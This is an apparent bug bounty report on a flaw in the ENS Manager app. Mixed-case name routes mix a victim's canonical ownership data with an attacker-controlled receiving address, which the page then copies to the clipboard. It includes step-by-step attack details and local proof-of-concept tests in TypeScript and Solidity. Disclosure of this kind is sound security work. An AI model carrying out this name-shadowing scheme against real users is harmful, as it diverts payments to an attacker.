# 91569 w a critical inconsistent ens name normalization displays and copies an attacker controlled address as the victim profile s main receiving address

**Submitted on Sep 2nd 2026 at 18:05:52 UTC by @PhantomBugz for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91569
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief

I found an identity binding flaw in the ENS Manager profile view. An attacker can register a raw ENSv2 label such as `Alice` while another user owns canonical `alice.eth`. When Manager opens `/Alice.eth`, it loads ownership, expiry, registration, and reverse name data for canonical `alice.eth`, but it resolves profile records through raw `Alice.eth`. The page therefore combines the victim's ownership data with the attacker's ETH record, labels that record **Main receiving address**, and copies the attacker's complete address when the card is clicked. A user who trusts the profile can send funds to the wrong recipient. The attacker does not need access to the victim's wallet, session, name, or resolver.

## Vulnerability details

I tested the competition source revision `63772fd872af472ced58b009499355f3430c2a86`, represented by the supplied audit snapshot at `cda79acaad59711b943fc68207ebb3f1d0ff8596`. The installed ENSJS dependency is `5.0.0-alpha.1` build `e96662c`.

{% stepper %}
{% step %}

## Manager preserves the raw route spelling

The `/$name` route validates only length and the presence of a dot, then returns the original string. The loader passes that same value into the owner and record queries.

Relevant locations:

1. `apps/manager/src/routes/$name/route.tsx:3-13`
2. `apps/manager/src/routes/$name/index.tsx:49-56`
3. `apps/manager/src/routes/$name/index.tsx:165-174`

For `/Alice.eth`, the value supplied to `ProfileView` remains `Alice.eth`.
{% endstep %}

{% step %}

## Owner and lifecycle lookups normalize the name

`getOwner()` calls `normalizeEthName()` and sends the normalized result to the V2 owner action:

```ts
const ethName = normalizeEthName(params.name)

const v2Owner = yield* fromPromise(
  ensjsv2_getOwner(client, { name: ethName.name }),
  (e) => new GetOwnerError({ cause: e }),
)
```

The relevant code is in `apps/manager/src/features/profile/service/profileOwner.ts:24-64`. With `Alice.eth`, this query is made for `alice.eth` and returns the canonical owner's address. The expiry and registration services independently normalize the same route before their V2 queries:

1. `apps/manager/src/features/profile/service/profileExpiry.ts:73-109`
2. `apps/manager/src/features/profile/service/profileRegistration.ts:62-124`
3. `apps/manager/src/features/profile/service/profileReverseName.ts:30-46`

The displayed owner, verified reverse name, registration date, and expiry therefore describe canonical `alice.eth`.
{% endstep %}

{% step %}

## Record lookup keeps the raw name

`getProfileRecords()` does not normalize its `name` argument before calling ENSJS:

```ts
const records = yield* fromPromise(
  getRecords(client, {
    name,
    texts,
    coins,
    contentHash: true,
    abi: true,
    ignoreInvalidCoinTypes: true,
  }),
  (error) => new GetProfileRecordsError({ cause: error }),
)
```

This is `apps/manager/src/features/profile/service/profileRecords.ts:82-132`. Coin type 60 is always probed, even when the indexer has no address row, through `apps/manager/src/features/profile/data/records/utils.ts:32-43`.
{% endstep %}

{% step %}

## ENSJS builds one request from two different interpretations

The pinned ENSJS build normalizes the name when constructing address record calldata:

```ts
namehash(normalize(name))
```

However, resolver discovery uses the original spelling when producing the outer DNS packet:

```ts
const nameWithSizedLabels = getNameWithSizedLabels(name)
```

```ts
args: [toHex(packetToBytes(nameWithSizedLabels)), multicallData]
```

The relevant dependency source is:

1. `src/utils/coders/getAddress.ts:92-139`
2. `src/actions/public/resolveNameData.ts:61-120`
3. `src/utils/name/getNameWithSizedLabels.ts:17-27`

For `Alice.eth`, the address calldata contains `namehash("alice.eth")`, while the DNS packet used to discover the resolver still contains `Alice.eth`.
{% endstep %}

{% step %}

## Raw `Alice` and canonical `alice` are separate V2 registrations

V2 computes label identity from the exact label bytes. `LibLabel.id("Alice")` and `LibLabel.id("alice")` are different, and the public registrar accepts and registers each label independently. The stateful PoC registers both values, confirms distinct token IDs and owners, and assigns a separate resolver to each.

The Universal Resolver follows the raw DNS labels and selects the resolver registered for raw `Alice`. The address calldata is then forwarded to that resolver. A resolver controlled by the attacker can legitimately return the attacker's address regardless of the canonical node argument.

This contract behavior establishes the prerequisite. The reported affected asset is the Manager application, because Manager combines the result from the raw attacker resource with metadata from the canonical victim resource.
{% endstep %}

{% step %}

## The attacker address reaches the payment UI and clipboard

`ProfileView` combines the canonical owner and lifecycle results with the raw record result at `apps/manager/src/features/profile/components/view/ProfileView.tsx:93-119` and `192-217`.

`getMainReceivingAddress()` prefers coin type 60. `ProfileAddressesSection` then renders that value under **Main receiving address** and passes the complete `address.value` into `CopyableButton`:

```tsx
<h3 className="mb-3 text-ens-quartz-600 text-sm leading-normal">
  <Trans>Main receiving address</Trans>
</h3>
<MainAddressCard
  address={mainAddress}
  avatarUrl={avatarUrl}
  chains={receivingChains}
  name={name}
/>
```

Relevant locations:

1. `apps/manager/src/features/profile/components/view/ProfileView.helpers.ts:229-244`
2. `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:76-124`
3. `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:154-179`
4. `apps/manager/src/components/atoms/CopyableButton/CopyableButton.tsx:34-38`
5. `apps/manager/src/lib/clipboard.ts:1-3`

The visible address is shortened for presentation, but `navigator.clipboard.writeText()` receives the attacker's full address.
{% endstep %}
{% endstepper %}

## Impact

The selected impact is the exact Critical impact published for this competition: causing the application to display or prefill an incorrect address so that a user sends funds to an unintended recipient, including rendering an ENS name to an attacker controlled address.

The practical attack is straightforward:

{% stepper %}
{% step %}

## The victim owns canonical `alice.eth`

{% endstep %}

{% step %}

## The attacker registers the distinct raw V2 label `Alice`

The attacker sets a resolver that returns the attacker's ETH address.
{% endstep %}

{% step %}

## The attacker shares the Manager URL containing `/Alice.eth`

{% endstep %}

{% step %}

## Manager presents mixed identity data

Manager presents the victim's canonical ownership and lifecycle information, but shows the attacker's record as **Main receiving address**.
{% endstep %}

{% step %}

## A payer copies and uses the attacker's address

A payer clicks the card, copies the attacker's full address, and uses it for a payment intended for the victim.
{% endstep %}
{% endstepper %}

This is not automatic or interaction free theft. The payer must visit the crafted route and use the displayed address. No payment or state changing public chain test was performed.

## Known issue distinction

Published issue EXP-INPUT-005 states that validators accept inputs which ENS normalization later transforms, but it expressly limits the known practical impact to homograph style display confusion rather than incorrect resolution. This report demonstrates a materially different consequence. Manager composes data from two valid, separately registered V2 resources and sends the attacker's address into an explicit receiving address and clipboard workflow under the victim's canonical metadata. The competition rules state that a new consequence which materially changes severity remains in scope.

Public bigname issue 204 concerns normalized versus literal verification of reverse name claims. It does not describe this Manager route, the canonical owner and raw record composition, the **Main receiving address** sink, or clipboard substitution.

## References

1. Competition scope and known issues: `https://immunefi.com/audit-competition/audit-competition-ens/scope/`
2. Public bigname issue 204: `https://github.com/ensdomains/bigname/issues/204`
3. Affected Manager asset: `https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager`

## Proof of Concept

All three tests are local and non destructive. They do not register a public name, send funds, or write to a public chain.

The tests cover three separate boundaries:

1. The stateful contract test proves `alice` and `Alice` can be separate V2 registrations and that changing the outer DNS name changes which resolver is selected.
2. The Manager service test proves ownership is queried with canonical `alice.eth` while records are queried with raw `Alice.eth`.
3. The component test proves the production profile components display the attacker's address as **Main receiving address** and copy the complete attacker address.

{% stepper %}
{% step %}

## Manager service identity split

Create `apps/manager/src/features/profile/service/profileRouteNormalizationMismatch.poc.test.ts` with this content:

```ts
import { beforeEach, describe, expect, it, vi } from 'vitest'

const VICTIM = '0x1111111111111111111111111111111111111111'
const ATTACKER = '0x2222222222222222222222222222222222222222'
const ATTACKER_RESOLVER = '0x3333333333333333333333333333333333333333'

const mocks = vi.hoisted(() => ({
  client: {},
  getRecords: vi.fn(),
  getV1Owner: vi.fn(),
  getV2Owner: vi.fn(),
  queryDomain: vi.fn(),
  queryDomainResult: vi.fn(),
}))

vi.mock('@ens-apps/indexer/urql', () => ({
  default: {
    query: mocks.queryDomain,
  },
}))

vi.mock('@ensdomains/ensjs/public', () => ({
  getRecords: mocks.getRecords,
}))

vi.mock('@ensdomains/ensjs/public/v1', () => ({
  getOwner: mocks.getV1Owner,
}))

vi.mock('@ensdomains/ensjs/public/v2', () => ({
  getOwner: mocks.getV2Owner,
}))

vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  return {
    safeGetClient: () => ok(mocks.client),
  }
})

import { getMainReceivingAddress } from '../components/view/ProfileView.helpers'
import { transformProfileRecords } from '../utils/transformRecords'
import { getOwner } from './profileOwner'
import { getProfileRecords } from './profileRecords'

describe('mixed-case profile route ownership/records mismatch PoC', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mocks.getV2Owner.mockResolvedValue(VICTIM)
    mocks.getV1Owner.mockResolvedValue(null)
    mocks.queryDomainResult.mockResolvedValue({ data: { domain: null } })
    mocks.queryDomain.mockReturnValue({ toPromise: mocks.queryDomainResult })
    mocks.getRecords.mockResolvedValue({
      texts: [],
      coins: [{ coinType: 60, symbol: 'eth', value: ATTACKER }],
      contentHash: null,
      abi: null,
      resolverAddress: ATTACKER_RESOLVER,
    })
  })

  it('shows a canonical victim owner while copying an address resolved through the raw attacker label', async () => {
    const rawRouteName = 'Alice.eth'

    const ownerResult = await getOwner({ name: rawRouteName })
    const profileResult = await getProfileRecords(rawRouteName)

    expect(ownerResult._unsafeUnwrap()).toEqual({
      owner: VICTIM,
      protocol: 'v2',
    })
    expect(mocks.getV2Owner).toHaveBeenCalledWith(mocks.client, {
      name: 'alice.eth',
    })

    expect(mocks.getRecords).toHaveBeenCalledWith(
      mocks.client,
      expect.objectContaining({ name: rawRouteName }),
    )
    const profile = transformProfileRecords(profileResult._unsafeUnwrap())
    expect(getMainReceivingAddress(profile)?.value).toBe(ATTACKER)
    expect(profileResult._unsafeUnwrap().resolverAddress).toBe(
      ATTACKER_RESOLVER,
    )
  })
})
```

Run it from the audit repository root:

```sh
pnpm --filter manager exec vitest run src/features/profile/service/profileRouteNormalizationMismatch.poc.test.ts
```

Expected result: one test passes. The assertion confirms that owner lookup receives `alice.eth`, record lookup receives `Alice.eth`, and the attacker's coin type 60 record becomes the main receiving address.
{% endstep %}

{% step %}

## Production component and clipboard sink

Create `apps/manager/src/features/profile/components/view/profileRouteDisplayClipboard.poc.test.tsx` with this content:

```tsx
import { fireEvent, screen, waitFor } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { render } from '@/utils/test-utils'
import { newEmptyProfileRecords } from '@/features/profile/utils/transformRecords'
import { ProfileAddressesSection } from '@/features/profile/components/view/ProfileAddressesSection'
import { ProfileHeader } from '@/features/profile/components/view/ProfileHeader'
import { ProfileThemeColorProvider } from '@/features/profile/components/view/ProfileThemeColor'

const RAW_ATTACKER_LABEL = 'Alice.eth'
const CANONICAL_VICTIM_NAME = 'alice.eth'
const VICTIM_OWNER = '0x1111111111111111111111111111111111111111'
const ATTACKER_ADDRESS = '0x2222222222222222222222222222222222222222'

const writeText = vi.fn<(_value: string) => Promise<void>>()

describe('mixed-case profile payment-address presentation PoC', () => {
  beforeEach(() => {
    writeText.mockReset()
    writeText.mockResolvedValue()
    Object.defineProperty(navigator, 'clipboard', {
      configurable: true,
      value: { writeText },
    })
  })

  it('renders canonical victim identity while copying the raw-label attacker address', async () => {
    const records = {
      ...newEmptyProfileRecords(),
      addresses: [{ coinType: 60, value: ATTACKER_ADDRESS }],
    }

    render(
      <ProfileThemeColorProvider value="#5298ff">
        <ProfileHeader
          avatarLoading={false}
          displayExpiryDate={new Date('2030-01-01T00:00:00Z')}
          name={RAW_ATTACKER_LABEL}
          owner={VICTIM_OWNER}
          ownerReverseName={CANONICAL_VICTIM_NAME}
          records={records}
          registrationDate={1_700_000_000}
        />
        <ProfileAddressesSection
          name={RAW_ATTACKER_LABEL}
          records={records}
        />
      </ProfileThemeColorProvider>,
    )

    expect(
      screen.getByRole('heading', { name: RAW_ATTACKER_LABEL }),
    ).toBeInTheDocument()
    expect(screen.getAllByText(CANONICAL_VICTIM_NAME).length).toBeGreaterThan(0)
    expect(screen.getByText('Main receiving address')).toBeInTheDocument()

    const receivingAddressCard = screen.getByTitle(ATTACKER_ADDRESS)
    fireEvent.click(receivingAddressCard)

    await waitFor(() => {
      expect(writeText).toHaveBeenCalledOnce()
      expect(writeText).toHaveBeenCalledWith(ATTACKER_ADDRESS)
    })
  })
})
```

Run it from the audit repository root:

```sh
pnpm --filter manager exec vitest run src/features/profile/components/view/profileRouteDisplayClipboard.poc.test.tsx
```

Expected result: one test passes. The real `ProfileHeader`, `ProfileAddressesSection`, `CopyableButton`, and clipboard helper render the victim context, label the attacker value **Main receiving address**, and send the full attacker address to `navigator.clipboard.writeText()`.
{% endstep %}

{% step %}

## Stateful V2 registration and resolver selection

Use `ensdomains/contracts-v2` at tag `sepolia-deployment-2026-06-29`, commit `48b3e2d39513b9dd32ef1850877a29009bc807b9`.

Create `contracts/test/ManagerNormalizationAlias.poc.t.sol` with this content:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {IERC7996} from "@ens/contracts/utils/IERC7996.sol";

import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {ETHRegistrar} from "~src/registrar/ETHRegistrar.sol";
import {LibLabel} from "~src/utils/LibLabel.sol";
import {V2Fixture} from "~test/fixtures/V2Fixture.sol";
import {StandardRentPriceOracleFixture} from "~test/fixtures/StandardRentPriceOracleFixture.sol";
import {StandardRegistrar} from "~test/StandardRegistrar.sol";

contract FixedAddressResolver {
    address immutable result;

    constructor(address result_) {
        result = result_;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC7996).interfaceId;
    }

    function supportsFeature(bytes4) external pure returns (bool) {
        return true;
    }

    function addr(bytes32) external view returns (address) {
        return result;
    }
}

contract ManagerNormalizationAliasPoC is V2Fixture, StandardRentPriceOracleFixture {
    ETHRegistrar registrar;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    FixedAddressResolver victimResolver;
    FixedAddressResolver attackerResolver;

    function setUp() external {
        deployV2Fixture();
        deployStandardRentPriceOracleFixture();

        registrar = new ETHRegistrar(
            address(this),
            ethRegistry,
            beneficiary,
            rentPriceOracle,
            StandardRegistrar.GRACE_PERIOD_V2,
            StandardRegistrar.MIN_COMMITMENT_AGE,
            StandardRegistrar.MAX_COMMITMENT_AGE,
            StandardRegistrar.MIN_REGISTER_DURATION
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTRAR | RegistryRolesLib.ROLE_RENEW,
            address(registrar)
        );

        setupPaymentTokens(victim, address(registrar));
        setupPaymentTokens(attacker, address(registrar));
        victimResolver = new FixedAddressResolver(victim);
        attackerResolver = new FixedAddressResolver(attacker);

        vm.warp(
            uint256(StandardRegistrar.GRACE_PERIOD_V2) +
                rentPriceOracle.PREMIUM_PERIOD() +
                1
        );
    }

    function test_mixedCaseLabelCanShadowCanonicalProfileResolution() external {
        uint256 victimToken = _register("alice", victim, address(victimResolver));
        uint256 attackerToken = _register("Alice", attacker, address(attackerResolver));

        assertNotEq(LibLabel.id("alice"), LibLabel.id("Alice"), "labels must be distinct");
        assertNotEq(victimToken, attackerToken, "registrations must be distinct");
        assertEq(ethRegistry.findOwner("alice"), victim, "canonical owner");
        assertEq(ethRegistry.findOwner("Alice"), attacker, "raw-label owner");

        bytes32 canonicalNode = NameCoder.namehash(NameCoder.encode("alice.eth"), 0);
        (bytes memory canonicalResponse, address canonicalResolver) = universalResolver.resolve(
            NameCoder.encode("alice.eth"),
            abi.encodeWithSignature("addr(bytes32)", canonicalNode)
        );

        assertEq(canonicalResolver, address(victimResolver), "canonical route selects victim resolver");
        assertEq(abi.decode(canonicalResponse, (address)), victim, "canonical route returns victim address");

        bytes memory rawRoute = NameCoder.encode("Alice.eth");
        (bytes memory response, address selectedResolver) = universalResolver.resolve(
            rawRoute,
            abi.encodeWithSignature("addr(bytes32)", canonicalNode)
        );

        assertEq(selectedResolver, address(attackerResolver), "raw route selects attacker resolver");
        assertEq(abi.decode(response, (address)), attacker, "profile receives attacker address");
    }

    function _register(string memory label, address owner, address resolver)
        internal
        returns (uint256 tokenId)
    {
        bytes32 secret = keccak256(abi.encode(label, owner));
        uint64 duration = registrar.MIN_REGISTER_DURATION();
        bytes32 commitment = registrar.makeCommitment(
            label,
            owner,
            secret,
            IRegistry(address(0)),
            resolver,
            duration,
            bytes32(0)
        );

        registrar.commit(commitment);
        vm.warp(block.timestamp + registrar.MIN_COMMITMENT_AGE());
        vm.prank(owner);
        tokenId = registrar.register(
            label,
            owner,
            secret,
            IRegistry(address(0)),
            resolver,
            duration,
            IERC20(address(tokenUSDC)),
            bytes32(0)
        );
    }
}
```

Run it from the `contracts` directory:

```sh
forge test --match-path test/ManagerNormalizationAlias.poc.t.sol -vvv
```

Expected result:

```
Ran 1 test for test/ManagerNormalizationAlias.poc.t.sol:ManagerNormalizationAliasPoC
[PASS] test_mixedCaseLabelCanShadowCanonicalProfileResolution()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The canonical control proves that `alice.eth` selects the victim resolver and returns the victim address. The attack case changes only the outer DNS name to `Alice.eth`, reuses the same canonical address node, selects the attacker resolver, and returns the attacker address.
{% endstep %}
{% endstepper %}

## Combined Manager verification

Both Manager tests can be run together:

```sh
pnpm --filter manager exec vitest run src/features/profile/service/profileRouteNormalizationMismatch.poc.test.ts src/features/profile/components/view/profileRouteDisplayClipboard.poc.test.tsx
```

Observed result:

```
Test Files  2 passed (2)
Tests       2 passed (2)
```

Type checking also succeeds:

```sh
pnpm --filter manager typecheck
```

## Read only deployment corroboration

At Sepolia block `11619670`, I used `eth_call` only against registrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc` and its configured oracle `0x8914b66260EB8C4fff795650c3AE8Cd335958987`.

Observed values:

```
chainId: 11155111
registrarHasCode: true
lowerAvailable: true
mixedAvailable: true
mixedValid: true
commitmentsDiffer: true
```

The tested labels were `pzeroaliassep02z9` and `PzeroAliassep02z9`. This read only check confirms that the deployed registrar accepts the mixed case label and generates a different commitment for the two spellings. It does not claim that I completed a live dual registration or a live payment exploit.
